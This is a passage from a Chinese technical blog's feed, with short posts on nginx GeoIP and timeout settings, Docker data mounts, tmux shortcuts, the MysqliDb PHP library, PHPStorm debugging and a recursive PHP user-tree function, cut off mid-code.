&#x2F;etc&#x2F;nginx&#x2F;geoip&#x2F;GeoIP-1.6.12&#x2F;data&#x2F;GeoIP.dat;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  location &#x2F;myip &#123;</span><br><span class="line">        default_type text&#x2F;plain;</span><br><span class="line">        return 200 &quot;$remote_addr $geoip_country_name $geoip_country_code $geoip_city&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>通过以下变量综合获取地域信息：</p><ul><li><code>$remote_addr</code>：IP地址</li><li><code>$geoip_country_name</code>：国家</li><li><code>$geoip_country_code</code>：对应编码</li><li><code>$geoip_city</code>：城市名称</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.geek-share.com/detail/2733570382.html" target="_blank" rel="noopener">nginx: [emerg] unknown directive “geoip_country” in /etc/nginx/nginx.conf:23</a></li><li><a href="https://github.com/maxmind/geoip-api-c" target="_blank" rel="noopener">install GeoIP</a></li><li><a href="https://docs.nginx.com/nginx/admin-guide/dynamic-modules/geoip2/" target="_blank" rel="noopener">install GeoIP module</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有一个需求：需要根据用户的IP 获取其国家，然后根据不同国家进行代理转发。&lt;/p&gt;</summary>
    
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Nginx/"/>
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Docker 数据挂载</title>
    <link href="https://www.0x2beace.com/docker-data-mount/"/>
    <id>https://www.0x2beace.com/docker-data-mount/</id>
    <published>2020-10-07T12:24:01.000Z</published>
    <updated>2020-10-07T12:24:40.708Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据挂载"><a href="#数据挂载" class="headerlink" title="数据挂载"></a>数据挂载</h3><p>数据挂载在Docker 中还是挺重要的一部分，因为有多种方式，而不同的方式所对应的处理数据的逻辑也不一样。</p><ol><li>Volumes：Docker 管理宿主机文件系统的一部分（/var/lib/docker/volumes）。</li><li>Bind Mounts：将宿主机上的任意位置的文件或目录挂载到容器中。</li><li>tmpfs：挂载存储在主机系统的内存中，而不会写入主机的文件系统。如果不系统将数据持久存储在任何位置，可以使用tmpfs，同时避免写入容器可写层提高性能。</li></ol><p>这里主要介绍前两者，后者使用的并不多。注意第一种和第二种是存在区别的，前者是使用的数据卷进行挂载，而后者则是直接使用的宿主机上的文件或者目录挂载到容器中。</p><p>众所周知，将容器删除之后，容器内所有的改动将不复存在。</p><p>挂载数据卷通常是最常用且最好的方式，这种方式会将容器中的数据持久化在宿主机中，这样做的好处就是当容器被删除或者无法正常启动时，数据仍是完整的。</p><p>挂载数据卷有两种方式：</p><ol><li>使用<code>--mount</code></li><li>使用<code>-v</code></li></ol><p>前者是新版本的方式，后者是老版本的方式，其效果都是一样的。</p><h4 id="Volumes"><a href="#Volumes" class="headerlink" title="Volumes"></a>Volumes</h4><p>创建一个数据卷：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume create &lt;volume name&gt;</span><br></pre></td></tr></table></figure><p>列出数据卷列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume ls</span><br></pre></td></tr></table></figure><p>列出数据卷的详情信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume inspect &lt;volume name&gt;</span><br></pre></td></tr></table></figure><p>删除数据卷：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume rm &lt;volume name&gt;</span><br></pre></td></tr></table></figure><p>用数据卷创建一个容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 新版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name&#x3D;nginx --mount src&#x3D;&lt;volume name&gt;,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line"># 老版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name&#x3D;nginx -v &lt;volume name&gt;:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>如果没有指定数据卷，则会自动创建</li></ol><h4 id="Bind-Mounts"><a href="#Bind-Mounts" class="headerlink" title="Bind Mounts"></a>Bind Mounts</h4><p>使用bind mounts 创建一个容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 新版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name nginx \</span><br><span class="line">-p 8080:80 \</span><br><span class="line">--mounts type&#x3D;bind,src&#x3D;&#x2F;var&#x2F;www,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line"># 老版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name nginx \</span><br><span class="line">-p 8080:80 \</span><br><span class="line">-v &#x2F;var&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><p>需要注意的是： </p><ol><li>如果源文件/目录没有存在，docker 不会自动创建，而会自动抛出一个错误。</li><li>如果挂载目标在容器中是非空目录，则该目录现有内容将被隐藏。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;数据挂载&quot;&gt;&lt;a href=&quot;#数据挂载&quot; class=&quot;headerlink&quot; title=&quot;数据挂载&quot;&gt;&lt;/a&gt;数据挂载&lt;/h3&gt;&lt;p&gt;数据挂载在Docker 中还是挺重要的一部分，因为有多种方式，而不同的方式所对应的处理数据的逻辑也不一样。&lt;/p&gt;
&lt;ol&gt;</summary>
      
    
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Docker/"/>
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>nginx 超时问题——upstream timed out (110: Connection timed out) while reading response header from upstream</title>
    <link href="https://www.0x2beace.com/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/"/>
    <id>https://www.0x2beace.com/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/</id>
    <published>2020-10-05T12:28:45.000Z</published>
    <updated>2020-10-05T12:29:53.756Z</updated>
    
    <content type="html"><![CDATA[<p>今天早上起来，发现后台登录不上，打开控制台发现几乎所有请求都超时了。</p><a id="more"></a><p>打开nginx 的异常日志可以看到全是相同的异常：</p><blockquote><p>upstream timed out (110: Connection timed out) while reading response header from upstream</p></blockquote><p>从这个异常日志可以分析出，由于nginx 代理去获取上游服务器的响应超时了，那么究竟是什么原因导致它会超时呢？</p><p>通常会导致请求超时可能有以下几个原因：</p><ol><li>接口比较复杂，响应时间慢，导致超时。</li><li>处理请求的进程异常。</li><li>代理服务器与上游服务器的网络问题。</li></ol><p>因为请求一直都是那些请求，所以第一种可能性可以排除。<br>另外子进程数量设置的是比较大，所以第二种应该也可以排除。</p><p>对于服务器的网络问题，如果条件允许，可以直接从根本上解决，另外也可以通过设置超时时间来延缓请求超时。</p><p>在server 中添加以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">large_client_header_buffers 4 16k;</span><br><span class="line">client_max_body_size 30m;</span><br><span class="line">client_body_buffer_size 128k;</span><br><span class="line"></span><br><span class="line">proxy_connect_timeout 240s;</span><br><span class="line">proxy_read_timeout 240s;</span><br><span class="line">proxy_send_timeout 240s;</span><br><span class="line">proxy_buffer_size 64k;</span><br><span class="line">proxy_buffers   4 32k;</span><br><span class="line">proxy_busy_buffers_size 64k;</span><br><span class="line">proxy_temp_file_write_size 64k;</span><br></pre></td></tr></table></figure><p>然后重启Nginx。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_read_timeout" target="_blank" rel="noopener">nginx 设置超时时间-Nginx 官网</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天早上起来，发现后台登录不上，打开控制台发现几乎所有请求都超时了。&lt;/p&gt;</summary>
    
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Nginx/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Tmux 快速上手</title>
    <link href="https://www.0x2beace.com/tmux-quick-start/"/>
    <id>https://www.0x2beace.com/tmux-quick-start/</id>
    <published>2020-10-04T12:39:38.000Z</published>
    <updated>2020-10-04T12:41:19.876Z</updated>
    
    <content type="html"><![CDATA[<p>本来之前就知道有 <code>tmux</code> 这样一个窗口分隔工具，只不过一直使用着<code>iTerm2</code>，本身就自带有标签页功能，所以就一直没去学习这个工具。</p><p>这段时间需要经常访问<code>Linux</code>服务器，所以在服务器上安装了这个工具。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Mac：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install tmux</span><br></pre></td></tr></table></figure><p>Linux:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tmux</span><br></pre></td></tr></table></figure><p>一般情况下 <code>tmux</code> 中所有的快捷键都需要和前缀快捷键 <code>⌃b</code> 来组合使用（注：⌃ 为 Mac 的 control 键），以下是常用的窗格（<code>pane</code>）快捷键列表。</p><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><p>第一次使用<code>tmux</code> 可能会被<code>Session</code>、<code>窗口</code>、<code>窗格</code> 这些陌生的概念，弄得摸不着头脑。</p><p>这里总结成一句话就是：<br><strong>一个完整的会话（Session）是由数个窗口组成，而一个窗口又可以分成若各个窗格。</strong></p><p>使用<code>tmux</code> 命令会默认新建一个<code>tmux</code> 会话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 默认新建一个Session 名称为 0 的窗口。</span><br><span class="line">tmux</span><br></pre></td></tr></table></figure><p>常用<code>Session</code>操作：</p><ul><li>$ 重命名当前会话</li><li>s 选择会话列表</li><li>d 退出当前会话（不是删除），运行后将会退出 tmux 进程，返回至 shell 主进程。</li></ul><h3 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h3><p>窗口的概念不同于窗格，窗口互不影响，窗格相互分隔。</p><p>常用窗口操作：</p><ul><li>c 新建窗口，此时当前窗口会切换至新窗口，不影响原有窗口的状态</li><li>p 切换至上一窗口</li><li>n 切换至下一窗口</li><li>w 窗口列表选择，注意 macOS 下使用 ⌃p 和 ⌃n 进行上下选择</li><li>&amp; 关闭当前窗口</li><li>, 重命名窗口，可以使用中文，重命名后能在 tmux 状态栏更快速的识别窗口 id</li><li>0 切换至 0 号窗口，使用其他数字 id 切换至对应窗口</li><li>f 根据窗口名搜索选择窗口，可模糊匹配</li></ul><h3 id="窗格"><a href="#窗格" class="headerlink" title="窗格"></a>窗格</h3><p>窗格是在窗口下的概念，若干个窗格组成一个窗口。</p><p>常用窗格操作：</p><ul><li>% 左右平分出两个窗格</li><li>“ 上下平分出两个窗格</li><li>x 关闭当前窗格</li><li>{ 当前窗格前移</li><li>} 当前窗格后移</li><li>; 选择上次使用的窗格</li><li>o 选择下一个窗格，也可以使用上下左右方向键来选择</li><li>space 切换窗格布局，tmux 内置了五种窗格布局，也可以通过 ⌥1 至 ⌥5来切换</li><li>z 最大化当前窗格，再次执行可恢复原来大小</li><li>q 显示所有窗格的序号，在序号出现期间按下对应的数字，即可跳转至对应的窗格</li></ul><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p>上面那些命令都是配合<code>⌃ + b</code>快捷键使用的，下面的这些命令都是在<code>Shell</code>进程中直接执行的。</p><p>新建名称为 foo 的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux new -s foo</span><br></pre></td></tr></table></figure><p>列出所有 tmux 会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux ls</span><br></pre></td></tr></table></figure><p>恢复上一次会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux a</span><br></pre></td></tr></table></figure><p>恢复名为 foo 的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux a -t foo</span><br></pre></td></tr></table></figure><p>删除名为 foo 的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux kill -session -t foo</span><br></pre></td></tr></table></figure><p>删除所有会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux kill -server</span><br></pre></td></tr></table></figure><h3 id="tmux-or-iterm2"><a href="#tmux-or-iterm2" class="headerlink" title="tmux or iterm2"></a>tmux or iterm2</h3><p><code>tmux</code> 和<code>iTerm2</code> 都有窗口管理方面的功能，只是前者相比后者的优势在于：</p><ul><li><code>iTerm2</code> 的窗格切换快捷键（<code>⌘⌥→</code>）容易与其他软件全局快捷键冲突（例如 <code>Spectacle</code> 的窗口分割快捷键），<code>tmux</code> 由于存在前缀快捷键，所以不存在快捷键冲突问题；</li><li><code>tmux</code> 可以在终端软件重启后通过命令行恢复上次的 <code>session</code> ，而终端软件则不行；</li><li><code>tmux</code> 简洁优雅、订制性强，学会之后也能在 <code>Linux</code> 上使用，有助于逼格提升。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://gist.github.com/ryerh/14b7c24dfd623ef8edc7" target="_blank" rel="noopener">Tmux 快捷键&amp;速查表&amp;简明教程</a></li><li><a href="https://www.cnblogs.com/kaiye/p/6275207.html" target="_blank" rel="noopener">十分钟学会 Tmux</a></li><li>[Tmux 快捷键和备忘录](</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本来之前就知道有 &lt;code&gt;tmux&lt;/code&gt; 这样一个窗口分隔工具，只不过一直使用着&lt;code&gt;iTerm2&lt;/code&gt;，本身就自带有标签页功能，所以就一直没去学习这个工具。&lt;/p&gt;
&lt;p&gt;这段时间需要经常访问&lt;code&gt;Linux&lt;/code&gt;服务器，所以在服务</summary>
      
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/categories/Linux/Mac/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
    <category term="Terminal" scheme="https://www.0x2beace.com/tags/Terminal/"/>
    
  </entry>
  
  <entry>
    <title>MysqliDb 快速上手</title>
    <link href="https://www.0x2beace.com/mysqlidb-is-quick-to-get-started/"/>
    <id>https://www.0x2beace.com/mysqlidb-is-quick-to-get-started/</id>
    <published>2020-10-02T07:26:03.000Z</published>
    <updated>2020-10-02T07:27:10.385Z</updated>
    
    <content type="html"><![CDATA[<p>MysqliDb 是基于 mysqli 扩展出来的一个类库，其中封装了很多常用的Mysql 基础操作，相比原生的方式，后者使用起来更加方便。</p><p>具有如下特点：</p><ol><li>支持链式操作</li><li>支持Mysql 函数的使用</li><li>…</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用composer 安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require thingengineer&#x2F;mysqli-database-class:dev-master</span><br></pre></td></tr></table></figure><p>因为<code>MysqliDb</code>没有命名空间，所以我们想要使用的话，不能自动加载，只能先引入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require &quot;MysqliDb.php&quot;;</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>初始化连接有几种方式：</p><h4 id="1-MysqliDb-字符串"><a href="#1-MysqliDb-字符串" class="headerlink" title="1. MysqliDb 字符串"></a>1. MysqliDb 字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new MysqliDb (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);</span><br></pre></td></tr></table></figure><h4 id="2-MysqliDb-对象"><a href="#2-MysqliDb-对象" class="headerlink" title="2. MysqliDb 对象"></a>2. MysqliDb 对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new MysqliDb ([</span><br><span class="line">  &#39;host&#39; &#x3D;&gt; &#39;host&#39;,</span><br><span class="line">  &#39;username&#39; &#x3D;&gt; &#39;username&#39;, </span><br><span class="line">  &#39;password&#39; &#x3D;&gt; &#39;password&#39;,</span><br><span class="line">  &#39;db&#39;&#x3D;&gt; &#39;databaseName&#39;,</span><br><span class="line">  &#39;port&#39; &#x3D;&gt; 3306,</span><br><span class="line">  &#39;prefix&#39; &#x3D;&gt; &#39;my_&#39;,</span><br><span class="line">  &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h4 id="3-mysqli-对象"><a href="#3-mysqli-对象" class="headerlink" title="3. mysqli 对象"></a>3. mysqli 对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$mysqli &#x3D; new mysqli (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);</span><br><span class="line">$db &#x3D; new MysqliDb ($mysqli);</span><br></pre></td></tr></table></figure><h3 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h3><p>向user 表中插入一条记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [</span><br><span class="line">  &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  &quot;age&quot; &#x3D;&gt; 21,</span><br><span class="line">  &quot;gender&quot; &#x3D;&gt; &quot;man&quot;</span><br><span class="line">];</span><br><span class="line">$success &#x3D; $db-&gt;insert(&quot;user&quot;, $data);</span><br></pre></td></tr></table></figure><p>返回值类型：bool</p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>修改user 表中的一条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [</span><br><span class="line">  &quot;age&quot; &#x3D;&gt; 22,</span><br><span class="line">];</span><br><span class="line">$success &#x3D; $db-&gt;where([&quot;name&quot; &#x3D;&gt; &quot;boo&quot;])</span><br><span class="line">   -&gt;update(&quot;user&quot;, $data);</span><br></pre></td></tr></table></figure><p>返回值类型：bool</p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><h4 id="获取user-表所有数据："><a href="#获取user-表所有数据：" class="headerlink" title="获取user 表所有数据："></a>获取user 表所有数据：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;get(&quot;user&quot;, null, &quot;*&quot;);</span><br></pre></td></tr></table></figure><p>返回值：多维数组</p><h4 id="获取user-表单条数据："><a href="#获取user-表单条数据：" class="headerlink" title="获取user 表单条数据："></a>获取user 表单条数据：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;getOne(&quot;user&quot;,  &quot;*&quot;);</span><br></pre></td></tr></table></figure><p>返回值：关联数组</p><h4 id="获取user-表单个字段的值："><a href="#获取user-表单个字段的值：" class="headerlink" title="获取user 表单个字段的值："></a>获取user 表单个字段的值：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;where(&quot;name&quot;, &quot;boo&quot;)</span><br><span class="line"> -&gt;getValue(&quot;user&quot;, &quot;*&quot;);</span><br></pre></td></tr></table></figure><p>返回值：string</p><h4 id="获取查询条数："><a href="#获取查询条数：" class="headerlink" title="获取查询条数："></a>获取查询条数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;getValue(&quot;user&quot;, &quot;count(*)&quot;);</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除user 表中一条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$success &#x3D; $db-&gt;where(&quot;user_id&quot;, &quot;boo&quot;)</span><br><span class="line">  -&gt;delete(&quot;user);</span><br></pre></td></tr></table></figure><h3 id="运行原生SQL"><a href="#运行原生SQL" class="headerlink" title="运行原生SQL"></a>运行原生SQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;rawQuery(&quot;select * from user where name &#x3D; \&quot;boo\&quot;&quot;)</span><br></pre></td></tr></table></figure><p>总体来说，MysqliDb 真的挺好用的，基本上可以满足所有日常需求。<br>这里只是列举了最基本的CURD，更多操作可以参考<a href="https://github.com/joshcam/PHP-MySQLi-Database-Class" target="_blank" rel="noopener">官网手册</a>。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://packagist.org/packages/joshcam/mysqli-database-class" target="_blank" rel="noopener">joshcam/mysqli-database-class</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;MysqliDb 是基于 mysqli 扩展出来的一个类库，其中封装了很多常用的Mysql 基础操作，相比原生的方式，后者使用起来更加方便。&lt;/p&gt;
&lt;p&gt;具有如下特点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;支持链式操作&lt;/li&gt;
&lt;li&gt;支持Mysql 函数的使用&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Mysqli" scheme="https://www.0x2beace.com/tags/Mysqli/"/>
    
  </entry>
  
  <entry>
    <title>PHPStrom 高级技巧整理</title>
    <link href="https://www.0x2beace.com/phpstorm-advanced-skills-finishing/"/>
    <id>https://www.0x2beace.com/phpstorm-advanced-skills-finishing/</id>
    <published>2020-10-01T02:39:34.000Z</published>
    <updated>2020-10-02T07:25:43.207Z</updated>
    
    <content type="html"><![CDATA[<p>PHPStrom 是我日常使用频率很高的 IDE。</p><p>基础的使用这里就不过多介绍了，这里主要是用来整理一些比较高级的用法。</p><h3 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h3><p>调试是日常开发中，不可缺少的一部分。</p><h4 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h4><p>通常都是用来调试本地代码，可如果需要调试虚拟机或者其他应用中时，那该怎么做呢？</p><p>打开偏好设置或者设置，找到一个已经配置好的服务，勾选映射。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200930144728.png" alt=""></p><p>然后找到该服务的入口配置文件，后面的文件路径填绝对路径。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHPStrom 是我日常使用频率很高的 IDE。&lt;/p&gt;
&lt;p&gt;基础的使用这里就不过多介绍了，这里主要是用来整理一些比较高级的用法。&lt;/p&gt;
&lt;h3 id=&quot;调试技巧&quot;&gt;&lt;a href=&quot;#调试技巧&quot; class=&quot;headerlink&quot; title=&quot;调试技巧&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="PHPStorm" scheme="https://www.0x2beace.com/tags/PHPStorm/"/>
    
  </entry>
  
  <entry>
    <title>递归算法</title>
    <link href="https://www.0x2beace.com/recursive-algorithm/"/>
    <id>https://www.0x2beace.com/recursive-algorithm/</id>
    <published>2020-09-30T12:21:12.000Z</published>
    <updated>2020-10-01T02:39:46.124Z</updated>
    
    <content type="html"><![CDATA[<p>最近在业务上遇到一个需求，需要根据已知的一个数一层一层查找除所有对应下级用户，然后将结果放在数组中。</p><a id="more"></a><p>最后返回的结果大概是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; [</span><br><span class="line">  0 &#x3D;&gt; [</span><br><span class="line">    &quot;user_id&quot; &#x3D;&gt; &quot;php&quot;,</span><br><span class="line">    &quot;sub_id&quot; &#x3D;&gt; [</span><br><span class="line">    0 &#x3D;&gt; [</span><br><span class="line">      &quot;user_id&quot; &#x3D;&gt; &quot;python&quot;,</span><br><span class="line">      &quot;sub_id&quot; &#x3D;&gt; []</span><br><span class="line">      ],</span><br><span class="line">      1 &#x3D;&gt; [</span><br><span class="line">      &quot;user_id&quot; &#x3D;&gt; &quot;go&quot;,</span><br><span class="line">      &quot;sup_id&quot; &#x3D;&gt; [</span><br><span class="line">      0 &#x3D;&gt; [</span><br><span class="line">      &quot;user_id&quot; &#x3D;&gt; &quot;ruby&quot;,</span><br><span class="line">      &quot;sub_id&quot; &#x3D;&gt; []</span><br><span class="line">      ]</span><br><span class="line">      ]</span><br><span class="line">      ],</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>这个问题的难点在于：</p><ol><li>我并不知道有多少个下级</li><li>索引是未知的。</li></ol><p>对于这个问题，首先第一个想到是使用递归算法来解决。</p><p>使用递归算法是没错，不过思路还是有些问题，我试图通过正向查找，然后将数据 push 至结果集。<br>所以这里存在一个问题：我需要知道数组具体的索引是多少。</p><p>在第一个思路无解之后，果断放弃了。<br>要解决这个问题，我得正向查找，逆向存值。</p><p>也就是把递归返回的结果压入到当前用户的数组中，然后返回当前用户，从最后一个用户往前处理。</p><p>最后实现的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function get_user_tree($user_id)&#123;</span><br><span class="line">$result &#x3D; [];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; todo（数据查询）</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 遍历数据 </span><br><span class="line">foreach ($data as $item)&#123;</span><br><span class="line">$user &#x3D; get_user_tree($item[&#39;user_id&#39;]);</span><br><span class="line">$item[&#39;sub_id&#39;] &#x3D; $user;</span><br><span class="line">array_push($result, $item);</span><br><span 